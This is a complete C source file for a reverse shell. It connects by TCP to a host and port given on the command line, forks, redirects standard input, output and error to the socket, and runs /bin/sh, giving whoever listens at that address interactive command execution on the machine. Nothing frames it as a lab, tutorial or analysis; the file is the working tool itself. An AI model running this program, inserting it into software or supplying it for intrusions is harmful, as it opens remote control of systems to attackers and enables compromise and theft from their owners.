#include <stdio.h>
#include <sys/types.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#define SHELL "/bin/sh"

static int _create_socket(int *p_sock)
{
        if (((*p_sock) = socket(AF_INET, SOCK_STREAM, 0)) > 0)
                return 1;

        return 0;
}

static int _gethostbyname(const char *p_host, struct hostent **p_hostent)
{
        if (((*p_hostent) = gethostbyname(p_host)) != NULL)
                return 1;

        return 0;
}

static void _exec(int sock, const char *name)
{
        /* connect the socket to process stdout, stdin and stderr */
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        /* running SHELL */
        execl(name, name, (char *)0);
        close(sock);
}

static void _connect(int sock, unsigned short port, struct hostent *p_hostent)
{
        struct sockaddr_in sockaddr;

        bzero((char *)&sockaddr, sizeof(sockaddr));
        bcopy((char *)p_hostent->h_addr, (char *)&sockaddr.sin_addr.s_addr, p_hostent->h_length);

        /* set family and port */
        sockaddr.sin_port   = htons(port);
        sockaddr.sin_family = AF_INET;

        /* connect and exec shell */
        if (connect(sock, (struct sockaddr *)&sockaddr, sizeof(sockaddr)) == 0)
                _exec(sock, SHELL);
}

static int _check_host(char *host)
{
        struct sockaddr_in sa;

        return inet_pton(AF_INET, host, &(sa.sin_addr));
}

int main(int argc, char *argv[])
{
        int            sock,
                       option;

        char           host[16];
        unsigned short port = 0;

        struct hostent *p_hostent = NULL;

        if (argc != 5)
                return -1;

        memset(host, '\0', 16);

        while ((option = getopt(argc, argv, "h:p:")) != -1) {
                switch (option) {
                        case 'h':
                                if (strlen(optarg) < 16)
                                        memcpy(host, optarg, strlen(optarg));
                                break;
                         case 'p':
                                 port = (unsigned short)strtoul(optarg, NULL, 0);
                                 break;
                }
        }

        if (!(_check_host(host)) && port != 0)
                return -1;

        /* Prevent child process from becoming zombie process */
        signal(SIGCLD, SIG_IGN);
        chdir("/");

        if (!_create_socket(&sock))
                return -1;

        if (!_gethostbyname(host, &p_hostent))
                return -1;

        if (fork() == 0)
                _connect(sock, port, p_hostent);

        return 0;
}

